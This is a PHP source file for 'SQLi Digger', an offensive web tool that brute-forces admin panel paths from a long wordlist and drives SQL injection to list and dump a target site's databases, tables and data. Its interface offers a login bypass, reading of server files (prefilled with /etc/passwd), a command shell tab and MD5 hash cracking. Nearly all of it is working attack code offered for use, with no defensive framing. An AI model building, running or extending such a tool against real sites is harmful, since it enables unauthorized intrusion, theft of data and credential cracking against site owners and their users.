<?php
error_reporting(E_ALL ^ E_NOTICE);
include_once('SqlDigger.class.php');

$global=array();

function curl2($site,$headers=false)
{
	global $global;
	$ch = curl_init($site);
	$header = array();
	$header[0]  = "Accept: text/xml,application/xml,application/xhtml+xml,";
	$header[0] .= "text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5";
	$header[]   = "Cache-Control: max-age=0";
	$header[]   = "Connection: keep-alive";
	$header[]   = "Keep-Alive: 300";
	$header[]   = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";
	$header[]   = "Accept-Language: en-us,en;q=0.5";
	$header[]   = "Pragma: "; // 1135browsers keep this blank.

	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,$url);

	curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.1.7) Gecko/20070914 Firefox/2.0.0.7');
	curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
	//curl_setopt($ch, CURLOPT_HEADER, 1);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_URL, $site);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	
	//proxy = '127.0.0.1:8888';
	//proxyauth = 'user:password';
	if($global['proxy'])
	{
		curl_setopt($ch, CURLOPT_PROXY, $global['proxy']);
		
		if($global['proxyauth']){
			curl_setopt($ch, CURLOPT_PROXYUSERPWD, $global['proxyauth']);
		}
	}
	
	$c=curl_exec($ch);
	if($headers){
		return array('header'=>curl_getinfo($ch, CURLINFO_HTTP_CODE),'content'=>$c);
	}else{
		return $c;
	}
}
function prepare($array)
{
	global $injection;
	return json_encode(array('result'=>$array,'injection'=>$injection->_INJECTION));
}

if( $_REQUEST['findpanel']!='')
{
	$domain=$_REQUEST['findpanel'];
	$success=explode(',',$_REQUEST['success']);
	$found=array();	
	$errorPages=array();
	$urls=array('0admin/','0admin/','0manager/','0manager/','AdminTools/','AdminTools/','Clave/','Database_Administration/','Database_Administration/','FCKeditor/editor/images/anchor.gif','Indy_admin/','Indy_admin/','LiveUser_Admin/','LiveUser_Admin/','Lotus_Domino_Admin/','Lotus_Domino_Admin/','P/W/','PSUser/','PSUser/','Personal/','Server.','Server.%EXT%','Server.%EXT%','Server.asp','Server.html','Server.php','Server/','Server/','ServerAdministrator/','ServerAdministrator/','Sing/','Super-Admin/','Super-Admin/','SysAdmin/','SysAdmin2/','SysAdmin2/','UserLogin/','UserLogin/','Usuario/','aadmin/','aadmin/','acceso.','acceso.%EXT%','acceso.%EXT%','acceso.asp','acceso.php','access.','access.%EXT%','access.%EXT%','access.asp','access.php','access/','access/','account.asp','account.cfm','account.html','account.php','accounts.','accounts.%EXT%','accounts.%EXT%','accounts.asp','accounts.php','accounts/','accounts/','acct_login/','acct_login/','acesso','adimin/','adiministrador/','adimistrador','adm','adm.','adm.%EXT%','adm.%EXT%','adm.asp','adm.cfm','adm.html','adm.php','adm/','adm/','adm/admloginuser.asp','adm/admloginuser.cfm','adm/admloginuser.php','adm/index.asp','adm/index.cfm','adm/index.html','adm/index.php','adm_auth.','adm_auth.%EXT%','adm_auth.%EXT%','adm_auth.asp','adm_auth.cfm','adm_auth.php','admcp','admin','admin','admin-login.','admin-login.%EXT%','admin-login.%EXT%','admin-login.asp','admin-login.cfm','admin-login.html','admin-login.php','admin.','admin.%EXT%','admin.%EXT%','admin.asp','admin.aspx','admin.cfm','admin.htm','admin.htm','admin.html','admin.html','admin.php','admin.xhtml','admin/','admin/','admin/account.','admin/account.%EXT%','admin/account.%EXT%','admin/account.asp','admin/account.cfm','admin/account.html','admin/account.html','admin/account.php','admin/admin-login.','admin/admin-login.%EXT%','admin/admin-login.%EXT%','admin/admin-login.asp','admin/admin-login.cfm','admin/admin-login.html','admin/admin-login.php','admin/admin.','admin/admin.%EXT%','admin/admin.%EXT%','admin/admin.asp','admin/admin.cfm','admin/admin.html','admin/admin.php','admin/adminLogin.','admin/adminLogin.%EXT%','admin/adminLogin.%EXT%','admin/adminLogin.asp','admin/adminLogin.cfm','admin/adminLogin.htm','admin/adminLogin.htm','admin/adminLogin.html','admin/adminLogin.html','admin/adminLogin.php','admin/admin_login.','admin/admin_login.%EXT%','admin/admin_login.%EXT%','admin/admin_login.asp','admin/admin_login.cfm','admin/admin_login.html','admin/admin_login.php','admin/controlpanel.','admin/controlpanel.%EXT%','admin/controlpanel.%EXT%','admin/controlpanel.asp','admin/controlpanel.cfm','admin/controlpanel.htm','admin/controlpanel.htm','admin/controlpanel.html','admin/controlpanel.html','admin/controlpanel.php','admin/cp.','admin/cp.%EXT%','admin/cp.%EXT%','admin/cp.asp','admin/cp.cfm','admin/cp.html','admin/cp.php','admin/home.','admin/home.%EXT%','admin/home.%EXT%','admin/home.asp','admin/home.cfm','admin/home.html','admin/home.php','admin/index.asp','admin/index.cfm','admin/index.html','admin/index.php','admin/login.','admin/login.%EXT%','admin/login.%EXT%','admin/login.asp','admin/login.cfm','admin/login.htm','admin/login.htm','admin/login.html','admin/login.html','admin/login.php','admin1.','admin1.%EXT%','admin1.%EXT%','admin1.asp','admin1.htm','admin1.htm','admin1.html','admin1.html','admin1.php','admin1/','admin1/','admin2.','admin2.%EXT%','admin2.%EXT%','admin2.asp','admin2.cfm','admin2.html','admin2.html','admin2.php','admin2/index.asp','admin2/index.cfm','admin2/index.php','admin2/login.asp','admin2/login.cfm','admin2/login.php','admin4_account/','admin4_account/','admin4_colon/','admin4_colon/','adminLogin','adminLogin.asp','adminLogin.cfm','adminLogin.html','adminLogin.php','adminLogin/','adminLogin/','admin_area','admin_area.','admin_area.%EXT%','admin_area.%EXT%','admin_area.asp','admin_area.php','admin_area/','admin_area/','admin_area/admin.','admin_area/admin.%EXT%','admin_area/admin.%EXT%','admin_area/admin.asp','admin_area/admin.asp','admin_area/admin.cfm','admin_area/admin.html','admin_area/admin.php','admin_area/index.asp','admin_area/index.cfm','admin_area/index.html','admin_area/index.php','admin_area/login.','admin_area/login.%EXT%','admin_area/login.%EXT%','admin_area/login.asp','admin_area/login.cfm','admin_area/login.html','admin_area/login.php','admin_login.','admin_login.%EXT%','admin_login.%EXT%','admin_login.asp','admin_login.cfm','admin_login.html','admin_login.php','adminare','adminarea','adminarea/','adminarea/','adminarea/admin.asp','adminarea/admin.cfm','adminarea/admin.html','adminarea/admin.php','adminarea/index.asp','adminarea/index.cfm','adminarea/index.html','adminarea/index.php','adminarea/login.asp','adminarea/login.cfm','adminarea/login.html','adminarea/login.php','admincontrol.','admincontrol.%EXT%','admincontrol.%EXT%','admincontrol.asp','admincontrol.cfm','admincontrol.html','admincontrol.php','admincontrol/','admincontrol/','admincontrol/login.asp','admincontrol/login.cfm','admincontrol/login.html','admincontrol/login.php','admincp','admincp/','admincp/','admincp/index.asp','admincp/index.cfm','admincp/index.html','admincp/login.','admincp/login.%EXT%','admincp/login.%EXT%','admincp/login.asp','admincp/login.cfm','admincp/login.php','administer/','administer/','administr8.','administr8.%EXT%','administr8.%EXT%','administr8.asp','administr8.html','administr8.php','administr8/','administr8/','administracao/','administrador/','administratie/','administratie/','administration.','administration.%EXT%','administration.%EXT%','administration.asp','administration.html','administration.php','administration/','administration/','administrator','administrator.','administrator.%EXT%','administrator.%EXT%','administrator.asp','administrator.cfm','administrator.html','administrator.php','administrator.php/','administrator/','administrator/','administrator/account.','administrator/account.%EXT%','administrator/account.%EXT%','administrator/account.asp','administrator/account.asp','administrator/account.cfm','administrator/account.html','administrator/account.php','administrator/index.asp','administrator/index.cfm','administrator/index.html','administrator/index.php','administrator/login.','administrator/login.%EXT%','administrator/login.%EXT%','administrator/login.asp','administrator/login.cfm','administrator/login.html','administrator/login.php','administratoraccounts/','administratoraccounts/','administratorlogin','administratorlogin.','administratorlogin.%EXT%','administratorlogin.%EXT%','administratorlogin.asp','administratorlogin.cfm','administratorlogin.php','administratorlogin/','administratorlogin/','administrators.','administrators.%EXT%','administrators.%EXT%','administrators.asp','administrators.php','administrators/','administrators/','administrivia/','administrivia/','adminitem.','adminitem.%EXT%','adminitem.%EXT%','adminitem.asp','adminitem.php','adminitem/','adminitem/','adminitems.','adminitems.%EXT%','adminitems.%EXT%','adminitems.asp','adminitems.php','adminitems/','adminitems/','adminlogin.','adminlogin.%EXT%','adminlogin.%EXT%','adminpanel.','adminpanel.%EXT%','adminpanel.%EXT%','adminpanel.asp','adminpanel.cfm','adminpanel.html','adminpanel.php','adminpanel/','adminpanel/','adminpro/','adminpro/','admins','admins.','admins.%EXT%','admins.%EXT%','admins.asp','admins.html','admins.php','admins/','admins/','adminsite/','adminsite/','admistrador','admloginuser.asp','admloginuser.cfm','admloginuser.php','admon/','affiliate.','affiliate.%EXT%','affiliate.%EXT%','affiliate.asp','affiliate.cfm','affiliate.php','auth.','auth.%EXT%','auth.%EXT%','auth.asp','auth.php','authadmin.','authadmin.%EXT%','authadmin.%EXT%','authadmin.asp','authadmin.php','authenticate.','authenticate.%EXT%','authenticate.%EXT%','authenticate.asp','authenticate.php','authentication.','authentication.%EXT%','authentication.%EXT%','authentication.asp','authentication.php','authuser.','authuser.%EXT%','authuser.%EXT%','authuser.asp','authuser.php','autologin.','autologin.%EXT%','autologin.%EXT%','autologin.asp','autologin.php','autologin/','autologin/','banneradmin/','banneradmin/','bb-admin','bb-admin/','bb-admin/','bb-admin/admin.','bb-admin/admin.%EXT%','bb-admin/admin.%EXT%','bb-admin/admin.asp','bb-admin/admin.cfm','bb-admin/admin.html','bb-admin/admin.html','bb-admin/admin.php','bb-admin/index.asp','bb-admin/index.cfm','bb-admin/index.html','bb-admin/index.php','bb-admin/login.','bb-admin/login.%EXT%','bb-admin/login.%EXT%','bb-admin/login.asp','bb-admin/login.cfm','bb-admin/login.html','bb-admin/login.php','bbadmin/','bbadmin/','bigadmin/','bigadmin/','blog/wp-login.','blog/wp-login.%EXT%','blog/wp-login.%EXT%','blogindex/','blogindex/','cadmins/','cadmins/','ccms/','ccms/index.php','ccms/login.php','ccp14admin/','ccp14admin/','cgi-bin/login','cgi-bin/login%EXT%','cgi-bin/login%EXT%','cgi-bin/loginasp','cgi-bin/loginphp','check.','check.%EXT%','check.%EXT%','check.asp','check.php','checkadmin.','checkadmin.%EXT%','checkadmin.%EXT%','checkadmin.asp','checkadmin.php','checklogin.','checklogin.%EXT%','checklogin.%EXT%','checklogin.asp','checklogin.php','checkuser.','checkuser.%EXT%','checkuser.%EXT%','checkuser.asp','checkuser.php','cms/','cms/','cmsadmin.','cmsadmin.%EXT%','cmsadmin.%EXT%','cmsadmin.asp','cmsadmin.php','cmsadmin/','cmsadmin/','config/','configuration/','configure/','control.','control.%EXT%','control.%EXT%','control.asp','control.php','control/','control/','controle','controles','controlpanel','controlpanel.','controlpanel.%EXT%','controlpanel.%EXT%','controlpanel.asp','controlpanel.cfm','controlpanel.html','controlpanel.php','controlpanel/','controlpanel/','cp','cp.','cp.%EXT%','cp.%EXT%','cp.asp','cp.cfm','cp.html','cp.php','cp/','cp/','cpanel','cpanel/','cpanel/','cpanel_file/','cpanel_file/','customer_login/','customer_login/','dir-login/','dir-login/','directadmin/','directadmin/','donos/','edit/','ezsqliteadmin/','ezsqliteadmin/','fileadmin.','fileadmin.%EXT%','fileadmin.%EXT%','fileadmin.asp','fileadmin.html','fileadmin.php','fileadmin/','fileadmin/','formslogin/','formslogin/','funcoes/','globes_admin/','globes_admin/','home.asp','home.cfm','home.html','home.php','hpwebjetadmin/','hpwebjetadmin/','index.swf','instadmin','instadmin/','instadmin/','irc-macadmin/','irc-macadmin/','irectadmin/','isadmin.','isadmin.%EXT%','isadmin.%EXT%','isadmin.asp','isadmin.php','joomla/administrator','js/%20id=','js/jquery-1.4.2.js 7 http://www.mirandam.com/panel/about_edit.php','js/url.slice(0,off)','key/','kpanel/','kpanel/','letmein.','letmein.%EXT%','letmein.%EXT%','letmein.asp','letmein.php','letmein/','letmein/','log-in.','log-in.%EXT%','log-in.%EXT%','log-in.asp','log-in.php','log-in/','log-in/','log_in.','log_in.%EXT%','log_in.%EXT%','log_in.asp','log_in.php','log_in/','log_in/','login','login%EXT%','login%EXT%','login-redirect/','login-redirect/','login-us/','login-us/','login.','login.%EXT%','login.%EXT%','login.asp','login.cfm','login.htm','login.htm','login.html','login.html','login.php','login/','login/','login1','login1%EXT%','login1%EXT%','login1/','login1/','login1asp','login1php','login_admin','login_admin%EXT%','login_admin%EXT%','login_admin/','login_admin/','login_adminasp','login_adminphp','login_db/','login_db/','login_out','login_out%EXT%','login_out%EXT%','login_out/','login_out/','login_outasp','login_outphp','login_user','login_user%EXT%','login_user%EXT%','login_userasp','login_userphp','loginasp','loginerror/','loginerror/','loginflat/','loginflat/','loginok/','loginok/','loginphp','loginsave/','loginsave/','loginsuper','loginsuper%EXT%','loginsuper%EXT%','loginsuper/','loginsuper/','loginsuperasp','loginsuperphp','logo_sysadmin/','logo_sysadmin/','logout','logout%EXT%','logout%EXT%','logout/','logout/','logoutasp','logoutphp','macadmin/','macadmin/','maintenance/','manage','manage.','manage.%EXT%','manage.%EXT%','manage.asp','manage.php','manage/','manage/','management.','management.%EXT%','management.%EXT%','management.asp','management.php','management/','management/','manager.','manager.%EXT%','manager.%EXT%','manager.asp','manager.php','manager/','manager/','manuallogin/','manuallogin/','member.','member.%EXT%','member.%EXT%','member.asp','member.php','member/','member/','memberadmin','memberadmin.','memberadmin.%EXT%','memberadmin.%EXT%','memberadmin.asp','memberadmin.cfm','memberadmin.php','memberadmin/','memberadmin/','members.','members.%EXT%','members.%EXT%','members.asp','members.php','members/','members/','membro','membros','membros/','memlogin/','memlogin/','meta_login/','meta_login/','modcp','modcp/','modelsearch/admin.asp','modelsearch/admin.cfm','modelsearch/admin.html','modelsearch/admin.php','modelsearch/index.asp','modelsearch/index.cfm','modelsearch/index.html','modelsearch/index.php','modelsearch/login.','modelsearch/login.%EXT%','modelsearch/login.%EXT%','modelsearch/login.asp','modelsearch/login.cfm','modelsearch/login.html','modelsearch/login.php','moderator','moderator.','moderator.%EXT%','moderator.%EXT%','moderator.asp','moderator.cfm','moderator.html','moderator.html','moderator.php','moderator.php','moderator.php/','moderator/','moderator/','moderator/admin.','moderator/admin.%EXT%','moderator/admin.%EXT%','moderator/admin.asp','moderator/admin.cfm','moderator/admin.html','moderator/admin.php','moderator/login.','moderator/login.%EXT%','moderator/login.%EXT%','moderator/login.asp','moderator/login.cfm','moderator/login.html','moderator/login.php','moderatorcp','modules/admin/','modules/admin/','myadmin/','myadmin/','navSiteAdmin/','navSiteAdmin/','net/','news_detail.php','newsadmin/','newsadmin/','not/','noticias/','nsw/admin/login.php','openvpnadmin/','openvpnadmin/','pages/admin/','pages/admin/','pages/admin/admin-login.','pages/admin/admin-login.%EXT%','pages/admin/admin-login.%EXT%','pages/admin/admin-login.asp','pages/admin/admin-login.cfm','pages/admin/admin-login.html','pages/admin/admin-login.php','painel','painel/','panel-administracion','panel-administracion/','panel-administracion/','panel-administracion/admin.asp','panel-administracion/admin.cfm','panel-administracion/admin.html','panel-administracion/admin.php','panel-administracion/index.asp','panel-administracion/index.cfm','panel-administracion/index.html','panel-administracion/index.php','panel-administracion/login.','panel-administracion/login.%EXT%','panel-administracion/login.%EXT%','panel-administracion/login.asp','panel-administracion/login.cfm','panel-administracion/login.html','panel-administracion/login.php','panel.','panel.%EXT%','panel.%EXT%','panel.asp','panel.php','panel/','panel/','panel/js/jquery.maskedinput.js','panelc/','paneldecontrol/','passe/','password/','pgadmin/','pgadmin/','php/','phpSQLiteAdmin/','phpSQLiteAdmin/','phpldapadmin/','phpldapadmin/','phpmyadmin/','phpmyadmin/','phppgadmin/','phppgadmin/','platz_login/','platz_login/','power_user/','power_user/','processlogin.','processlogin.%EXT%','processlogin.%EXT%','processlogin.asp','processlogin.php','project-admins/','project-admins/','pureadmin/','pureadmin/','radmind-1/','radmind-1/','radmind/','radmind/','raiz','rcLogin/','rcLogin/','rcjakar/admin/login.php','registration/','registration/','relogin.','relogin.%EXT%','relogin.%EXT%','relogin.asp','relogin.htm','relogin.htm','relogin.html','relogin.html','relogin.php','root','root/','root/','roots','saff/','secret/','secret/','secrets/','secrets/','secure/','secure/','security/','security/','senha','senha/','senhas/','ser.asp','server_admin_small/','server_admin_small/','sff/','showlogin/','showlogin/','sign-in.','sign-in.%EXT%','sign-in.%EXT%','sign-in.asp','sign-in.php','sign-in/','sign-in/','sign_in.','sign_in.%EXT%','sign_in.%EXT%','sign_in.asp','sign_in.php','sign_in/','sign_in/','signin.','signin.%EXT%','signin.%EXT%','signin.asp','signin.php','signin/','signin/','simpleLogin/','simpleLogin/','sistema/','siteadmin.','siteadmin.%EXT%','siteadmin.%EXT%','siteadmin.asp','siteadmin.php','siteadmin/','siteadmin/','siteadmin/index.asp','siteadmin/index.cfm','siteadmin/index.php','siteadmin/login.asp','siteadmin/login.cfm','siteadmin/login.html','siteadmin/login.php','smblogin/','smblogin/','sql-admin/','sql-admin/','ss_vms_admin_sm/','ss_vms_admin_sm/','sshadmin/','sshadmin/','staradmin/','staradmin/','sub-login/','sub-login/','super','super%EXT%','super%EXT%','super1','super1%EXT%','super1%EXT%','super1/','super1/','super1asp','super1php','super_index','super_index%EXT%','super_index%EXT%','super_indexasp','super_indexphp','super_login','super_login%EXT%','super_login%EXT%','super_loginasp','super_loginphp','superasp','superman','superman%EXT%','superman%EXT%','superman/','superman/','supermanager','supermanager%EXT%','supermanager%EXT%','supermanagerasp','supermanagerphp','supermanasp','supermanphp','superphp','superuser','superuser%EXT%','superuser%EXT%','superuser.','superuser.%EXT%','superuser.%EXT%','superuser.asp','superuser.php','superuser/','superuser/','superuserasp','superuserphp','supervise/','supervise/','supervise/Login','supervise/Login%EXT%','supervise/Login%EXT%','supervise/Loginasp','supervise/Loginphp','supervisor/','supervisor/','support_login/','support_login/','sys-admin/','sys-admin/','sysadm.','sysadm.%EXT%','sysadm.%EXT%','sysadm.asp','sysadm.php','sysadm/','sysadm/','sysadmin.','sysadmin.%EXT%','sysadmin.%EXT%','sysadmin.asp','sysadmin.html','sysadmin.php','sysadmin/','sysadmins/','sysadmins/','system-administration/','system-administration/','system_administration/','system_administration/','typo3/','typo3/','ur-admin.','ur-admin.%EXT%','ur-admin.%EXT%','ur-admin.asp','ur-admin.html','ur-admin.php','ur-admin/','ur-admin/','usager/','user.','user.%EXT%','user.%EXT%','user.asp','user.cfm','user.html','user.php','user/','user/','user/admin.','user/admin.%EXT%','user/admin.%EXT%','useradmin/','useradmin/','userlogin.','userlogin.%EXT%','userlogin.%EXT%','userlogin.asp','userlogin.php','username/','users.','users.%EXT%','users.%EXT%','users.asp','users.php','users/','users/','users/admin.','users/admin.%EXT%','users/admin.%EXT%','usr/','usr/','usuario','usuarios','usuarios/','utility_login/','utility_login/','uvpanel/','uvpanel/','vadmind/','vadmind/','vmailadmin/','vmailadmin/','vorod.','vorod.%EXT%','vorod.%EXT%','vorod.asp','vorod.php','vorod/','vorod/','vorud.','vorud.%EXT%','vorud.%EXT%','vorud.asp','vorud.php','vorud/','vorud/','webadmin','webadmin.','webadmin.%EXT%','webadmin.%EXT%','webadmin.asp','webadmin.cfm','webadmin.html','webadmin.php','webadmin/','webadmin/','webadmin/admin.asp','webadmin/admin.cfm','webadmin/admin.html','webadmin/admin.php','webadmin/index.asp','webadmin/index.cfm','webadmin/index.html','webadmin/index.php','webadmin/login.asp','webadmin/login.cfm','webadmin/login.html','webadmin/login.php','webmaster.','webmaster.%EXT%','webmaster.%EXT%','webmaster.asp','webmaster.php','webmaster/','webmaster/','websvn/','wizmysqladmin/','wizmysqladmin/','wp-admin','wp-admin/','wp-admin/','wp-login.php','wp-login.php','wp-login/','wp-login/','xlogin/','xlogin/','yonetici.','yonetici.%EXT%','yonetici.%EXT%','yonetici.asp','yonetici.html','yonetici.html','yonetici.php','yonetim.','yonetim.%EXT%','yonetim.%EXT%','yonetim.asp','yonetim.html','yonetim.html','yonetim.php','ysadmin.asp');

	if(sizeof($success)<1){
		die('[]');//you idiot?
	}
	//wrong petitions to filter errors
	$errorPages['file']=curl2($domain.'/3g5353534g53g334g34.htm');		
	$errorPages['folder']=curl2($domain.'/3g5353534g53g334g34/');
	
	foreach($urls as $url)
	{
		$url=str_replace('%EXT%','php',$url);
		$res=curl2($domain.'/'.$url,true);
		if(in_array($res['header'],$success) && $res['content']!='' && $res['content']!=$errorPages['file'] && $res['content']!=$errorPages['folder']){
			$found[]=array(
				'header'=>$res['header'],
				'page'=>$domain.'/'.$url,
				);
		}
	}
	die(json_encode($found));		
}
elseif(isset($_REQUEST['injection']) || $_REQUEST['injection']!='')
{
	$petition=$_REQUEST['petition'];
	
	$injection=new SqlDigger($_REQUEST['injection']);

	foreach($petition['array'] as $k=>$q)
	{
		$r=$injection->show($petition['what'],$q);
	}
	
	if($petition['what']!='file' && $petition['what']!='data'){
		$r=array();
	}
	die(prepare($r));
}elseif(isset($_REQUEST['url']) || $_REQUEST['url']!=''){

	$injection=new SqlDigger(array('url'=>$_REQUEST['url']));
	$injection->debug=false;
	$injection->init();
	$injection->getRows();
	$r=$injection->show('databases');

	echo prepare($r);

	die();
}
?>
<html>
<head>
	<title>SQLi Digger - 1135</title>
	<link rel="stylesheet" type="text/css" href="css/sql.css" />	
	<script type="text/javascript" src="js/sql.js"></script>
</head>
<body>
	<center>
		<div style="margin-bottom: 20px">
			<h1>SQLi Digger</h1>
			<input style="width:500px;" name="url" id="url" placeholder="http://site.com/?id=2" type="text"><button onclick="check();">Check</button>
			<br><label>POST (optional):<input style="width:400px;" name="post" type="text"></label><br>
			<label>login bypass?<select name="islogin" id="islogin"><option value="">no</option><option value="1">yes</option></select></label>
		</div>
	</center>
	<div id="tabOptions">
		<span class="pointer selected" load="tablesTab"><div class="digger tables"></div>Tables</span>
		<span class="pointer" load="fileTab"><div class="digger file"></div>Read files</span>
		<span class="pointer" ><div class="digger cmd"></div>cmd Shell</span>
		<span class="pointer"><div class="digger query"></div>Query</span>
		<span class="pointer" load="adminTab"><div class="digger admin"></div>Find Admin</span>
		<span class="pointer" load="md5Tab"><div class="digger md5"></div>MD5</span>
		<span class="pointer"><div class="digger settings"></div>Settings</span>
	</div>
	<div id="result">
		<div id="fileTab" class="tab oculto">
			<label>File address: <input id="fileDir"type="text" value="/etc/passwd"></label><button onclick="showFile();">Read</button><br>
			<textarea id="fileResult">				
			</textarea>	
		</div>
		<div id="md5Tab" class="tab oculto">
			<label>MD5 Hash: <input id="hash"type="text"></label><button onclick="findHash();">Start</button>
			<div id="md5Results">
				<table cellpadding="3" border="1">
					<tbody>
						<tr>
							<th>Site</th>
							<th>Pass</th>
						</tr>
					</tbody>
				</table>
			</div>	
		</div>
		<div id="adminTab" class="tab oculto">
			<div>
				<label style="display:inline;">Path to search: <input id="adminUrl"type="text"></label><button onclick="findPanel();">Start</button>
				<label>Success res: <input id="successRes"type="text" value="200,500,301,302,403"/></label>
			</div>
			<div id="adminResults">
				<table cellpadding="3" border="1">
					<tbody>
						<tr>
							<th>Page</th>
							<th>Response</th>
						</tr>
					</tbody>
				</table>
			</div>				
		</div>
		<div id="tablesTab" class="tab">
			<div id="middleOptions">
				<button id="showTables" disabled="disabled"><div class="digger table"></div>Get Tables</button>
				<button id="showColumns" disabled="disabled"><div class="digger column"></div>Get Columns</button>
				<button id="showData" disabled="disabled"><div class="digger data"></div>Get Data</button>
				<button id="saveData" disabled="disabled"><div class="digger save"></div>Save Data</button>
			</div>
			<div id="middle">
				<ul id="databaseTree" class="treeview">			
				</ul>
				<div id="columns">
				</div>
			</div>
		</div>
			<div id="statusBar">
				<img id="loadingIcon"style="display:none;"src="images/loading_icon.gif"/>
				<span>Status:</span> <span id="status" class="blue">I'm IDLE</span>
				<span style="float:right" onclick="clearLog();" class="blue pointer">Clear log</span>
			</div>
			<div id="console">
			</div>
		
	</div>
	<script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>	
	<script type="text/javascript" src="js/jstree.js"></script>
		<script type="text/javascript">
		$(document)
			.on('click','#middleOptions #showTables',function(){			
				show('tables');
			})
			.on('click','#middleOptions #showColumns',function(){			
				show('columns');
			})
			.on('click','#middleOptions #showData',function(){			
				show('data');
			})
			.on('click','#middleOptions #saveData',function(){			
				saveDump();
			})
			.on('click','#tabOptions span',function(){			
				var tab=$(this).attr('load'),
					itsTab={};
				if(tab==null){return false;}
				
				$('#tabOptions span').each(function()
				{
					itsTab=$(this).attr('load');
					if(tab!=null){$('#'+itsTab).hide();}
					$(this).removeClass('selected');
				});
				$(this).addClass('selected');
				$('#'+tab).show();
			})
			;

		firstTime=true;
		injection={};		
	</script>
</body>
</html>
